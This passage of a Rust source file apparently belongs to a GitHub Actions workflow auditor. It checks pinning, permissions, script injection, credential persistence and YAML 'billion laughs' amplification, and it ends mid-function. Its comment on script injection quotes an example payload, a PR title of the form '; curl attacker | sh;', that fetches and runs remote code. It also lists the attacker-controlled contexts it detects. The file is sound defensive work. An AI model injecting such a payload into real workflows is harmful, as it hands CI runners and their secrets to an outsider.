//! GitHub Actions workflow auditing.
//!
//! Basic audit (Phase 1 `actions-audit`): SHA pinning + least-privilege
//! permissions. Extended audit (Phase 4 `workflow-audit-extended`):
//! pull_request_target misuse, script injection (attacker-controlled contexts
//! expanded into `run:`), credential persistence, secret exposure in logs,
//! risky third-party actions (with StepSecurity maintained-action
//! substitutions), lockfile-exact installs, and Harden-Runner presence.

use crate::config::Config;
use crate::context::Ctx;
use crate::controls::{Outcome, VerifyResult};
use crate::exec;
use anyhow::{Context as _, Result};
use std::time::Duration;
use yaml_rust2::{Yaml, YamlLoader};

/// Hard cap on YAML anchor DECLARATIONS (`&name`) plus alias REFERENCES
/// (`*name`) permitted in one document — checked BEFORE any of it reaches
/// the YAML parser.
///
/// This, not a time budget, is what actually closes the vector (issue #43).
/// The first fix here was a wall-clock timeout around the parse, on its own
/// thread — and MEASUREMENT (replaying a 30-level document through the real,
/// ASAN-instrumented `workflow_audit` fuzz target) proved that insufficient:
/// the timeout bounds how long the CALLER waits, not what the abandoned
/// thread does afterward. That thread went on to allocate past 2.5GB and
/// trip libFuzzer's OOM guard in under 7 seconds — memory is shared across
/// every thread in a process, so "the caller already returned an error" is
/// not "the resource is contained". A time budget that lets the real cost
/// keep running in the background is a false assurance, not a fix.
///
/// So the defense has to happen before yaml-rust2 ever sees the bytes.
/// `yaml-rust2` 0.10.4 — the version this crate pins, and every version
/// through 0.13.0, its latest as of this writing, per its own changelog —
/// applies no bound to alias/anchor expansion: a document of N three-line
/// anchors, each aliasing the previous TWICE, is under 25 bytes per level
/// and roughly DOUBLES parse cost per level (96µs at 5 levels, 664ms at 22,
/// under 500 bytes total). No real GitHub Actions workflow or composite
/// action uses YAML anchors at all — the feature exists in the YAML 1.1
/// spec, not in GitHub's authoring guidance — so refusing anything with more
/// than a handful of anchor/alias tokens costs genuine files nothing while
/// making the amplification shape structurally unreachable: with at most
/// this many tokens total, the worst possible blowup a malicious arrangement
/// could construct is a small, fixed, sub-millisecond bound, not an
/// unbounded exponential one.
const YAML_ANCHOR_ALIAS_LIMIT: usize = 16;

/// Conservatively count anchor-declaration and alias-reference TOKENS in raw
/// YAML text, without parsing it.
///
/// Deliberately an OVER-count, not a precise grammar: it matches `&`/`*` at
/// any position YAML allows a scalar to start — after whitespace, `:`, `-`,
/// `,`, `[`, or `{`, or at the very start of the document — immediately
/// followed by at least one anchor-name character. That is the conservative
/// direction to be wrong in. A `run:` step's shell content essentially never
/// puts `&`/`*` directly after one of those bytes with no space (`ls *.txt`
/// has a space before `*`; `cmd &` backgrounding has `&` at END of a token,
/// not the start) — false positives are rare and refusing one is a far
/// better failure mode than parsing an amplification document. This is a
/// COUNTING pass only; it never allocates the anchor/alias NAMES, never
/// builds a document tree, and its own cost is linear in the input length
/// with no recursion — it cannot itself be turned into the attack it exists
/// to detect.
fn count_anchor_alias_tokens(content: &str) -> usize {
    fn is_boundary(prev: Option<u8>) -> bool {
        match prev {
            None => true,
            Some(b) => matches!(b, b'\n' | b' ' | b'\t' | b':' | b'-' | b'[' | b'{' | b','),
        }
    }
    fn is_name_char(b: u8) -> bool {
        b.is_ascii_alphanumeric() || b == b'_' || b == b'-'
    }

    let bytes = content.as_bytes();
    let mut count = 0usize;
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        if (b == b'&' || b == b'*') && is_boundary(i.checked_sub(1).map(|p| bytes[p])) {
            let start_of_name = i + 1;
            let mut j = start_of_name;
            while j < bytes.len() && is_name_char(bytes[j]) {
                j += 1;
            }
            if j > start_of_name {
                count += 1;
                i = j;
                continue;
            }
        }
        i += 1;
    }
    count
}

/// Refuse a YAML document whose anchor/alias token count exceeds
/// [`YAML_ANCHOR_ALIAS_LIMIT`] — see that constant's doc comment for why
/// this, and not a parse timeout, is the real fix.
fn refuse_yaml_amplification_shape(content: &str) -> Result<()> {
    let count = count_anchor_alias_tokens(content);
    anyhow::ensure!(
        count <= YAML_ANCHOR_ALIAS_LIMIT,
        "{count} YAML anchor/alias tokens (`&name` or `*name`) found — refused before parsing. \
         No real GitHub Actions workflow or composite action uses this many; this is the shape \
         of a YAML \"billion laughs\" amplification document, not a legitimate file"
    );
    Ok(())
}

/// Upper bound on how long parsing may run after the anchor/alias check
/// above has already passed.
///
/// Explicitly a SECONDARY backstop, not the primary defense: it catches a
/// CPU-time pathology unrelated to alias amplification (a future yaml-rust2
/// regression, or some other shape not yet measured) that the count check
/// above would not see coming. It does **not** bound memory — a document
/// that blows this budget leaves its worker thread running until the
/// process exits, and that thread can still allocate in the meantime, which
/// is precisely the property that disqualified a timeout as the primary fix
/// above. Two seconds is generous for any real workflow file.
const YAML_PARSE_BUDGET: Duration = Duration::from_secs(2);

/// Parse untrusted workflow/action YAML: refuse the measured amplification
/// shape outright, then apply the CPU-time backstop for anything else.
fn parse_workflow_yaml(content: &str) -> Result<Vec<Yaml>> {
    parse_workflow_yaml_with_budget(content, YAML_PARSE_BUDGET)
}

/// The budget is a parameter so tests can prove the backstop fires in
/// milliseconds against the exact code path production uses, rather than
/// burning real seconds per test or asserting against a mock that could
/// drift from what `parse_workflow_yaml` actually does. The anchor/alias
/// check above is unconditional regardless of budget — it is not a timing
/// concern, so there is nothing to parameterize about it.
fn parse_workflow_yaml_with_budget(content: &str, budget: Duration) -> Result<Vec<Yaml>> {
    refuse_yaml_amplification_shape(content)?;
    let owned = content.to_string();
    run_with_timeout(budget, move || YamlLoader::load_from_str(&owned))?.context("YAML parse error")
}

/// Run `f` on a background thread and wait up to `budget` for it to finish.
///
/// Split out from `parse_workflow_yaml_with_budget` so the timeout mechanism
/// itself can be tested with a workload whose duration the test controls
/// completely (a sleep), rather than racing a real YAML parse of trivial
/// content against a zero-duration budget — that construction looked like a
/// deterministic proof but wasn't: a CI runner fast enough to complete the
/// spawn-parse-send round trip before the main thread's very next
/// instruction turns `recv_timeout(Duration::ZERO)` into a coin flip. See
/// the corresponding test for the real failure this replaced.
fn run_with_timeout<T: Send + 'static>(
    budget: Duration,
    f: impl FnOnce() -> T + Send + 'static,
) -> Result<T> {
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        // The receiver may already be gone (budget expired) — a send error
        // here only means nobody is listening any more.
        let _ = tx.send(f());
    });
    rx.recv_timeout(budget)
        .map_err(|_| anyhow::anyhow!("did not finish within {budget:?} — refused rather than hung"))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Error,
    Warn,
    Info,
}

#[derive(Debug, Clone)]
pub struct Finding {
    pub severity: Severity,
    pub file: String,
    pub message: String,
}

impl Finding {
    pub(crate) fn new(severity: Severity, file: &str, message: String) -> Self {
        Finding {
            severity,
            file: file.to_string(),
            message,
        }
    }
}

/// Known-risky third-party actions with maintained, drop-in StepSecurity
/// replacements. Kept deliberately small and defensible.
pub const RISKY_ACTION_SUBSTITUTIONS: &[(&str, &str)] = &[
    // Compromised March 2025 (CVE-2025-30066): secrets dumped from runner memory.
    ("tj-actions/changed-files", "step-security/changed-files"),
    ("tj-actions/branch-names", "step-security/branch-names"),
    // Frequently flagged for over-privileged token use; maintained fork exists.
    (
        "dawidd6/action-download-artifact",
        "step-security/action-download-artifact",
    ),
];

/// The one sanctioned non-SHA pin: slsa-github-generator MUST be referenced by
/// semver tag for slsa-verifier to validate the trusted builder ref
/// (upstream README, slsa-verifier issue #12).
const TAG_PIN_EXCEPTION_REPO: &str = "slsa-framework/slsa-github-generator";

/// Does this action path belong to the one repository the tag-pin exception
/// names?
///
/// A `starts_with` prefix test does not answer that question: it also matches
/// `slsa-framework/slsa-github-generator-anything`, a DIFFERENT repository
/// under the same owner, which would have inherited a licence to use mutable
/// refs from a rule written for exactly one builder. The exception ends at the
/// repository boundary — the path is either the repo itself or a `/`-separated
/// path inside it.
pub(crate) fn is_tag_pin_exception(action: &str) -> bool {
    action == TAG_PIN_EXCEPTION_REPO
        || action
            .strip_prefix(TAG_PIN_EXCEPTION_REPO)
            .is_some_and(|rest| rest.starts_with('/'))
}

/// Does this `uses:` reference an actions/checkout-shaped action?
///
/// The credential-persistence hazard belongs to the BEHAVIOUR, not to the
/// `actions` org: a fork (`myorg/checkout`) or a re-publish
/// (`myorg/checkout-action`, `myorg/action-checkout`) leaves the same
/// GITHUB_TOKEN in `.git/config` for every later step to read. Matching the
/// literal string `actions/checkout@` asked the question of one publisher and
/// silently exempted all the others.
///
/// Deliberately narrow: the repository name, minus a conventional
/// `action-`/`-action` decoration, must BE `checkout`. An action whose name
/// merely contains the word is not one.
fn is_checkout_action(uses: &str) -> bool {
    let action = uses.split('@').next().unwrap_or(uses);
    let Some(repo) = action.split('/').nth(1) else {
        return false;
    };
    let lower = repo.to_ascii_lowercase();
    let stem = lower.strip_prefix("action-").unwrap_or(&lower);
    let stem = stem.strip_suffix("-action").unwrap_or(stem);
    stem == "checkout"
}

/// A YAML document that holds nothing — what a trailing `---` separator
/// produces. It is not a second workflow and owes no findings.
fn is_blank_doc(doc: &Yaml) -> bool {
    matches!(doc, Yaml::Null | Yaml::BadValue)
}

pub(crate) fn is_full_sha(s: &str) -> bool {
    s.len() == 40 && s.chars().all(|c| c.is_ascii_hexdigit())
}

pub(crate) fn is_semver_tag(s: &str) -> bool {
    let Some(rest) = s.strip_prefix('v') else {
        return false;
    };
    let parts: Vec<&str> = rest.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
}

/// Prefix each finding raised by one document of a multi-document file with
/// which document it came from — otherwise the operator gets a finding they
/// cannot locate in the file.
fn locate(findings: &mut [Finding], index: usize, total: usize) {
    if total < 2 {
        return;
    }
    for f in findings.iter_mut() {
        f.message = format!("document {}: {}", index + 1, f.message);
    }
}

/// Audit one workflow file — EVERY YAML document in it.
///
/// A `---` separator used to end the audit: only `docs.first()` was ever
/// examined, so any jobs, actions or permissions living below the separator
/// were reported as clean without being looked at. Whether GitHub itself runs
/// a second document is beside the point — sscsb must not call a file clean on
/// the strength of the half it read.
pub fn audit_workflow(file: &str, content: &str, extended: bool) -> Result<Vec<Finding>> {
    let docs = parse_workflow_yaml(content).with_context(|| format!("parsing YAML in {file}"))?;
    let live: Vec<&Yaml> = docs.iter().filter(|d| !is_blank_doc(d)).collect();
    if live.is_empty() {
        return Ok(vec![Finding::new(
            Severity::Warn,
            file,
            "empty workflow file".into(),
        )]);
    }
    let mut findings = Vec::new();
    if live.len() > 1 {
        findings.push(Finding::new(
            Severity::Warn,
            file,
            format!(
                "file holds {} YAML documents — a GitHub Actions workflow file is a single \
                 document, so at least one of these is not the workflow anyone thinks is \
                 running; all of them were audited rather than assumed inert",
                live.len()
            ),
        ));
    }
    for (i, doc) in live.iter().enumerate() {
        let mut of_doc = Vec::new();
        audit_permissions(file, doc, &mut of_doc);
        audit_uses_refs(file, doc, &mut of_doc);

        if extended {
            audit_pull_request_target(file, doc, content, &mut of_doc);
            audit_script_injection(file, doc, &mut of_doc);
            audit_checkout_credentials(file, doc, &mut of_doc);
            audit_secret_exposure(file, doc, &mut of_doc);
            audit_risky_actions(file, doc, &mut of_doc);
            audit_lockfile_exact(file, doc, &mut of_doc);
            audit_harden_runner(file, doc, &mut of_doc);
        }
        locate(&mut of_doc, i, live.len());
        findings.extend(of_doc);
    }
    Ok(findings)
}

pub(crate) fn jobs(doc: &Yaml) -> Vec<(&str, &Yaml)> {
    let mut out = Vec::new();
    if let Some(jobs) = doc["jobs"].as_hash() {
        for (k, v) in jobs {
            if let Some(name) = k.as_str() {
                out.push((name, v));
            }
        }
    }
    out
}

pub(crate) fn steps(job: &Yaml) -> Vec<&Yaml> {
    job["steps"]
        .as_vec()
        .map(|v| v.iter().collect())
        .unwrap_or_default()
}

/// Every `uses:` in the workflow — both step-level actions and job-level
/// reusable workflows.
fn all_uses(doc: &Yaml) -> Vec<String> {
    let mut out = Vec::new();
    for (_, job) in jobs(doc) {
        if let Some(u) = job["uses"].as_str() {
            out.push(u.to_string());
        }
        for step in steps(job) {
            if let Some(u) = step["uses"].as_str() {
                out.push(u.to_string());
            }
        }
    }
    out
}

fn audit_uses_refs(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for uses in all_uses(doc) {
        check_uses_ref(file, &uses, findings);
    }
}

/// Pin-check a single `uses:` reference. Local (`./`) actions are resolved and
/// audited separately (see [`audit_repo`]). A `docker://` image is a `uses:`
/// ref like any other and is held to the same bar: a tag can move, a digest
/// cannot. (Until 0.4 these were skipped as "pinned elsewhere" — nothing
/// checked them anywhere.)
fn check_uses_ref(file: &str, uses: &str, findings: &mut Vec<Finding>) {
    if uses.starts_with("./") {
        return;
    }
    if let Some(image) = uses.strip_prefix("docker://") {
        if !image.contains("@sha256:") {
            findings.push(Finding::new(
                Severity::Error,
                file,
                format!(
                    "`{uses}` runs a container image by tag — pin \
                     `docker://{image}@sha256:<digest>`"
                ),
            ));
        }
        return;
    }
    let Some((action, r)) = uses.rsplit_once('@') else {
        findings.push(Finding::new(
            Severity::Error,
            file,
            format!("`{uses}` has no ref — pin to a full commit SHA"),
        ));
        return;
    };
    if is_full_sha(r) {
        return;
    }
    if is_tag_pin_exception(action) && is_semver_tag(r) {
        findings.push(Finding::new(
            Severity::Info,
            file,
            format!(
                "`{uses}` is tag-pinned by design: slsa-github-generator must be referenced \
                 by @vX.Y.Z for slsa-verifier to verify the trusted builder"
            ),
        ));
        return;
    }
    findings.push(Finding::new(
        Severity::Error,
        file,
        format!("`{uses}` uses mutable ref `@{r}` — pin to a full 40-char commit SHA"),
    ));
}

/// Every `uses:` inside a local composite action's `runs.steps`.
fn composite_action_uses(doc: &Yaml) -> Vec<String> {
    let mut out = Vec::new();
    if let Some(steps) = doc["runs"]["steps"].as_vec() {
        for step in steps {
            if let Some(u) = step["uses"].as_str() {
                out.push(u.to_string());
            }
        }
    }
    out
}

/// Audit a local composite action definition (`.github/actions/<x>/action.yml`).
/// These are `uses: ./...`-referenced from workflows and were previously a blind
/// spot: a local action can pull in an unpinned third-party action, and the
/// workflow-level audit never looked inside it.
pub fn audit_action_file(file: &str, content: &str) -> Result<Vec<Finding>> {
    let docs = parse_workflow_yaml(content).with_context(|| format!("parsing YAML in {file}"))?;
    let live: Vec<&Yaml> = docs.iter().filter(|d| !is_blank_doc(d)).collect();
    if live.is_empty() {
        return Ok(vec![Finding::new(
            Severity::Warn,
            file,
            "empty action file".into(),
        )]);
    }
    let mut findings = Vec::new();
    // Same reasoning as `audit_workflow`: a `---` is not the end of the file.
    for (i, doc) in live.iter().enumerate() {
        let mut of_doc = Vec::new();
        for uses in composite_action_uses(doc) {
            check_uses_ref(file, &uses, &mut of_doc);
        }
        locate(&mut of_doc, i, live.len());
        findings.extend(of_doc);
    }
    Ok(findings)
}

fn permissions_is_write_all(perms: &Yaml) -> bool {
    perms.as_str() == Some("write-all")
}

/// The scopes a `permissions:` block grants at `write`, in declaration order.
fn write_scopes(perms: &Yaml) -> Vec<String> {
    let Some(hash) = perms.as_hash() else {
        return Vec::new();
    };
    hash.iter()
        .filter(|(_, level)| level.as_str() == Some("write"))
        .filter_map(|(scope, _)| scope.as_str().map(str::to_string))
        .collect()
}

/// How many scopes the GITHUB_TOKEN has, per GitHub's Actions documentation:
/// actions, attestations, checks, contents, deployments, discussions,
/// id-token, issues, models, packages, pages, pull-requests,
/// repository-projects, security-events, statuses.
const TOKEN_SCOPE_COUNT: usize = 15;

/// At this many distinct write scopes, a grant has stopped describing a job
/// and started describing a role.
///
/// The most privileged job sscsb itself ships is a release that pushes the
/// release, publishes a package, mints an OIDC token and writes an attestation
/// — four scopes, one coherent purpose. Nothing legitimate that could be named
/// needs five, so five is where `write-all` has merely been spelled out. This
/// threshold is deliberately ABOVE every real workflow rather than at the edge
/// of one: a count low enough to catch `contents: write` would flag every
/// release workflow in existence, which is noise, not least privilege.
const WRITE_ALL_BY_ENUMERATION: usize = 5;

/// The scope whose write grant reaches OUTSIDE the job's own build: `actions:
/// write` can delete or replace another workflow run's artifacts and caches
/// (the ClusterFuzzLite/Ultralytics cache-poisoning class) and cancel or
/// re-run workflows.
const CI_CONTROL_SCOPE: &str = "actions";

/// Scopes that let a job ship something the world consumes.
const PUBLISH_SCOPES: &[&str] = &[
    "contents",
    "packages",
    "attestations",
    "deployments",
    "id-token",
];

/// What "least privilege" means beyond the literal string `write-all`.
///
/// Breadth cannot be judged by counting alone — a release job legitimately
/// needs `contents: write` — so only two shapes are called out, both chosen to
/// be silent on every workflow sscsb ships and on every ordinary one that
/// could be named:
///
/// 1. Write on so many scopes that the grant IS `write-all`, enumerated.
/// 2. The right to tamper with CI state (`actions: write`) held together with
///    the right to publish — one compromised step can then poison the build
///    AND ship the result, which neither half can do alone.
fn audit_permission_breadth(file: &str, held_by: &str, perms: &Yaml, findings: &mut Vec<Finding>) {
    let writes = write_scopes(perms);
    if writes.len() >= WRITE_ALL_BY_ENUMERATION {
        findings.push(Finding::new(
            Severity::Error,
            file,
            format!(
                "{held_by} grants write on {} of the GITHUB_TOKEN's {TOKEN_SCOPE_COUNT} scopes \
                 ({}) — that is `write-all` spelled out; grant only the scopes the job uses",
                writes.len(),
                writes.join(", ")
            ),
        ));
        return;
    }
    let publish: Vec<&String> = writes
        .iter()
        .filter(|s| PUBLISH_SCOPES.contains(&s.as_str()))
        .collect();
    if writes.iter().any(|s| s == CI_CONTROL_SCOPE) && !publish.is_empty() {
        let with: Vec<&str> = publish.iter().map(|s| s.as_str()).collect();
        findings.push(Finding::new(
            Severity::Warn,
            file,
            format!(
                "{held_by} holds `actions: write` alongside `{}` — `actions: write` can replace \
                 another run's artifacts and caches, so one compromised step in this job can \
                 poison the build AND publish the result; split the tampering right off into a \
                 job that cannot publish",
                with.join("`, `")
            ),
        ));
    }
}

fn audit_permissions(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    let top = &doc["permissions"];
    let top_present = !top.is_badvalue();
    if top_present && permissions_is_write_all(top) {
        findings.push(Finding::new(
            Severity::Error,
            file,
            "top-level `permissions: write-all` — grant specific least-privilege scopes".into(),
        ));
    }
    if top_present {
        audit_permission_breadth(file, "the top-level `permissions:` block", top, findings);
    }
    let mut all_jobs_scoped = true;
    let mut inheritors = Vec::new();
    for (name, job) in jobs(doc) {
        let jp = &job["permissions"];
        if jp.is_badvalue() {
            all_jobs_scoped = false;
            inheritors.push(name.to_string());
        } else if permissions_is_write_all(jp) {
            findings.push(Finding::new(
                Severity::Error,
                file,
                format!("job `{name}` uses `permissions: write-all`"),
            ));
        } else {
            audit_permission_breadth(file, &format!("job `{name}`"), jp, findings);
        }
    }
    if !top_present && !all_jobs_scoped {
        findings.push(Finding::new(
            Severity::Error,
            file,
            "no `permissions:` block at workflow or job level — the default GITHUB_TOKEN grant \
             is too broad; add an explicit least-privilege block"
                .into(),
        ));
    }
    if top_present {
        audit_top_level_write_reach(file, top, &inheritors, findings);
    }
}

/// A write scope at the TOP level is granted to every job that does not
/// override it — including the job that only runs the test suite, and
/// including every job added to the file later. This is the placement half of
/// least privilege (and what OpenSSF Scorecard's Token-Permissions check looks
/// at): the same scope on the one job that needs it has a fraction of the
/// blast radius.
///
/// The finding distinguishes a grant that is live from one that is latent,
/// because those deserve different urgency and a tool that conflates them is
/// the reason people stop reading its output.
fn audit_top_level_write_reach(
    file: &str,
    top: &Yaml,
    inheritors: &[String],
    findings: &mut Vec<Finding>,
) {
    let writes = write_scopes(top);
    if writes.is_empty() {
        return;
    }
    let scopes = writes
        .iter()
        .map(|s| format!("{s}: write"))
        .collect::<Vec<_>>()
        .join(", ");
    if inheritors.is_empty() {
        findings.push(Finding::new(
            Severity::Info,
            file,
            format!(
                "top-level `{scopes}` is currently overridden by every job, but it stays the \
                 default for the next job added — prefer a read-only top-level block"
            ),
        ));
    } else {
        let jobs = inheritors
            .iter()
            .map(|j| format!("`{j}`"))
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding::new(
            Severity::Warn,
            file,
            format!(
                "top-level `{scopes}` is inherited by job(s) {jobs}, which never asked for it — \
                 move the grant down to the job that needs it and leave the top level read-only"
            ),
        ));
    }
}

fn audit_pull_request_target(file: &str, doc: &Yaml, raw: &str, findings: &mut Vec<Finding>) {
    let triggers = &doc["on"];
    let has_prt = match triggers {
        Yaml::String(s) => s == "pull_request_target",
        Yaml::Array(a) => a.iter().any(|v| v.as_str() == Some("pull_request_target")),
        Yaml::Hash(h) => h.keys().any(|k| k.as_str() == Some("pull_request_target")),
        _ => false,
    };
    if !has_prt {
        return;
    }
    let checks_out_pr_head = raw.contains("github.event.pull_request.head");
    if checks_out_pr_head {
        findings.push(Finding::new(
            Severity::Error,
            file,
            "`pull_request_target` combined with checkout of the PR head — untrusted code runs \
             with a privileged token (classic pwn-request); use `pull_request` or split the \
             privileged half into a separate workflow"
                .into(),
        ));
    } else {
        findings.push(Finding::new(
            Severity::Warn,
            file,
            "`pull_request_target` trigger — runs with a privileged token in the base repo \
             context; ensure it never executes PR-controlled code"
                .into(),
        ));
    }
}

/// Contexts an outside contributor controls verbatim — an issue or PR title,
/// a commit message, a branch name. Interpolated into a `run:` script with
/// `${{ }}` they are expanded by the runner BEFORE the shell parses the
/// script, so `"; curl attacker | sh; "` in a PR title runs as the workflow.
/// This is the script-injection half of OpenSSF Scorecard's
/// Dangerous-Workflow check; the set below is Scorecard's own
/// (`checks/raw/dangerous_workflow.go`, `untrustedContextPattern`), plus the
/// discussion and `blocked_user` payloads GitHub added since.
const INJECTABLE_CONTEXTS: &[&str] = &[
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.head_commit.message",
    "github.event.head_commit.author.name",
    "github.event.head_commit.author.email",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.default_branch",
    "github.head_ref",
];

/// Array-shaped contexts, where an index or `*` sits between prefix and
/// suffix: `github.event.commits[0].message`, `github.event.commits.*.author.name`,
/// `github.event.pages.*.page_name`, and anything under `github.event.blocked_user`.
const INJECTABLE_WILDCARDS: &[(&str, &str)] = &[
    ("github.event.commits", ".message"),
    ("github.event.commits", ".author.name"),
    ("github.event.commits", ".author.email"),
    ("github.event.pages", ".page_name"),
    ("github.event.blocked_user", ""),
];

/// Every `${{ … }}` expression body in a `run:` script, in order.
fn expressions(run: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut rest = run;
    while let Some(start) = rest.find("${{") {
        let after = &rest[start + 3..];
        let Some(end) = after.find("}}") else { break };
        out.push(after[..end].trim());
        rest = &after[end + 2..];
    }
    out
}

/// Name the attacker-controlled context inside one expression, or `None`
/// when it reads only trusted contexts (`github.sha`, `secrets.*`, `matrix.*`,
/// `github.event.pull_request.head.sha`, …).
fn injectable_context(expr: &str) -> Option<String> {
    let compact: String = expr
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect::<String>()
        .to_ascii_lowercase();
    // Serialising the whole event dumps every untrusted field at once.
    for whole in ["tojson(github.event)", "tojson(github)"] {
        if compact.contains(whole) {
            return Some(whole.replace("tojson", "toJSON"));
        }
    }
    if let Some(ctx) = INJECTABLE_CONTEXTS.iter().find(|c| compact.contains(*c)) {
        return Some((*ctx).to_string());
    }
    for (prefix, suffix) in INJECTABLE_WILDCARDS {
        if let Some(at) = compact.find(prefix) {
            let rest = &compact[at + prefix.len()..];
            if suffix.is_empty() || rest.contains(suffix) {
                return Some(format!("{prefix}.*{suffix}"));
            }
        }
    }
    None
}

/// Script injection: an attacker-controlled context expanded into a `run:`
/// script. Scoped to `run:` bodies exactly as Scorecard scopes it — the same
/// context in `with:`, `env:` or `concurrency:` is not shell-expanded (and
/// `env:` + `"$VAR"` is the documented fix, so it must stay clean).
fn audit_script_injection(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for (name, job) in jobs(doc) {
        for step in steps(job) {
            let Some(run) = step["run"].as_str() else {
                continue;
            };
            let mut seen: Vec<String> = Vec::new();
            for expr in expressions(run) {
                let Some(ctx) = injectable_context(expr) else {
                    continue;
                };
                if seen.contains(&ctx) {
                    continue;
                }
                seen.push(ctx.clone());
                findings.push(Finding::new(
                    Severity::Error,
                    file,
                    format!(
                        "job `{name}`: `${{{{ {ctx} }}}}` is interpolated into a `run:` script — \
                         the runner expands attacker-controlled text into the shell before it \
                         parses (script injection; Scorecard Dangerous-Workflow); pass it \
                         through `env:` and reference `\"$VAR\"` instead"
                    ),
                ));
            }
        }
    }
}

fn audit_checkout_credentials(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for (name, job) in jobs(doc) {
        for step in steps(job) {
            let Some(uses) = step["uses"].as_str() else {
                continue;
            };
            if !is_checkout_action(uses) {
                continue;
            }
            let action = uses.split('@').next().unwrap_or(uses);
            let persist = &step["with"]["persist-credentials"];
            let disabled = persist.as_bool() == Some(false) || persist.as_str() == Some("false");
            if !disabled {
                findings.push(Finding::new(
                    Severity::Warn,
                    file,
                    format!(
                        "job `{name}`: `{action}` checks out code without \
                         `persist-credentials: false` — the GITHUB_TOKEN stays on disk for later \
                         steps to exfiltrate"
                    ),
                ));
            }
        }
    }
}

fn audit_secret_exposure(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for (name, job) in jobs(doc) {
        for step in steps(job) {
            let Some(run) = step["run"].as_str() else {
                continue;
            };
            let uses_secret = run.contains("${{ secrets.") || run.contains("${{secrets.");
            let dumps = run.contains("echo")
                || run.contains("printenv")
                || run.contains("env |")
                || run.contains("set -x");
            if uses_secret && dumps {
                findings.push(Finding::new(
                    Severity::Warn,
                    file,
                    format!(
                        "job `{name}`: a `run:` step both references `secrets.*` and echoes/dumps \
                         environment — check for secret exposure in logs"
                    ),
                ));
            }
        }
    }
}

fn audit_risky_actions(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for uses in all_uses(doc) {
        let action = uses.split('@').next().unwrap_or(&uses);
        for (risky, replacement) in RISKY_ACTION_SUBSTITUTIONS {
            if action == *risky {
                findings.push(Finding::new(
                    Severity::Warn,
                    file,
                    format!(
                        "`{action}` has a maintained StepSecurity replacement: `{replacement}` — \
                         prefer the maintained fork (see docs/phase-4.md)"
                    ),
                ));
            }
        }
    }
}

fn audit_lockfile_exact(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    const PATTERNS: &[(&str, &str)] = &[
        (
            "npm install",
            "use `npm ci` for lockfile-exact installs in CI",
        ),
        (
            "yarn install",
            "add `--frozen-lockfile` (or use `yarn install --immutable`)",
        ),
        ("pnpm install", "add `--frozen-lockfile`"),
        ("cargo install ", "add `--locked` so Cargo.lock is honored"),
    ];
    for (name, job) in jobs(doc) {
        for step in steps(job) {
            let Some(run) = step["run"].as_str() else {
                continue;
            };
            for (pat, advice) in PATTERNS {
                let lockfile_exact = run.contains("--frozen-lockfile")
                    || run.contains("--immutable")
                    || run.contains("--locked")
                    || (pat.starts_with("npm") && run.contains("npm ci"));
                if run.contains(pat) && !lockfile_exact {
                    findings.push(Finding::new(
                        Severity::Warn,
                        file,
                        format!("job `{name}`: `{pat}` is not lockfile-exact — {advice}"),
                    ));
                }
            }
        }
    }
}

/// Whether ONE job runs under Harden-Runner.
///
/// Harden-Runner protects the job whose step list it heads — not the file it
/// happens to appear in, and never a `#`-commented mention of itself. The
/// question is therefore only answerable per job, off the parsed document.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HardenRunner {
    /// The job's first step is `step-security/harden-runner@…`.
    Present,
    /// The job delegates to a reusable workflow and has no steps of its own,
    /// so no harden-runner step can be added here — hardening is the called
    /// workflow's responsibility. Carries the `uses:` target.
    Reusable(String),
    /// The job runs its own steps without starting them under harden-runner.
    Absent,
}

fn harden_runner_of(job: &Yaml) -> HardenRunner {
    // A reusable-workflow job has no steps of its own to harden.
    if let Some(uses) = job["uses"].as_str() {
        if steps(job).is_empty() {
            return HardenRunner::Reusable(uses.to_string());
        }
    }
    let first_uses = steps(job)
        .first()
        .and_then(|s| s["uses"].as_str())
        .unwrap_or("");
    if first_uses.starts_with("step-security/harden-runner@") {
        HardenRunner::Present
    } else {
        HardenRunner::Absent
    }
}

/// Per-job Harden-Runner status for one parsed workflow document.
fn harden_runner_jobs(doc: &Yaml) -> Vec<(String, HardenRunner)> {
    jobs(doc)
        .into_iter()
        .map(|(name, job)| (name.to_string(), harden_runner_of(job)))
        .collect()
}

/// Per-job Harden-Runner status for a workflow file's raw text, across EVERY
/// YAML document in it. Parsing is the point: a substring search over the text
/// matches commented-out references and cannot tell one job from another.
///
/// An empty result means the file declares no jobs at all — which proves
/// nothing about harden-runner, and callers must not read it as a pass.
pub fn harden_runner_status(content: &str) -> Result<Vec<(String, HardenRunner)>> {
    let docs = parse_workflow_yaml(content).context("parsing workflow YAML")?;
    Ok(docs.iter().flat_map(harden_runner_jobs).collect())
}

fn audit_harden_runner(file: &str, doc: &Yaml, findings: &mut Vec<Finding>) {
    for (name, status) in harden_runner_jobs(doc) {
        if status == HardenRunner::Absent {
            findings.push(Finding::new(
                Severity::Warn,
                file,
                format!(
                    "job `{name}` does not start with step-security/harden-runner — runner \
                     egress/tamper monitoring is absent for this job"
                ),
            ));
        }
    }
}

/// Audit all workflows in the repo.
pub fn audit_repo(ctx: &Ctx, extended: bool) -> Result<Vec<Finding>> {
    let dir = ctx.root.join(".github").join("workflows");
    let mut findings = Vec::new();
    if !dir.is_dir() {
        return Ok(findings);
    }
    let mut entries: Vec<_> = std::fs::read_dir(&dir)?
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .filter(|p| {
            p.extension()
                .and_then(|e| e.to_str())
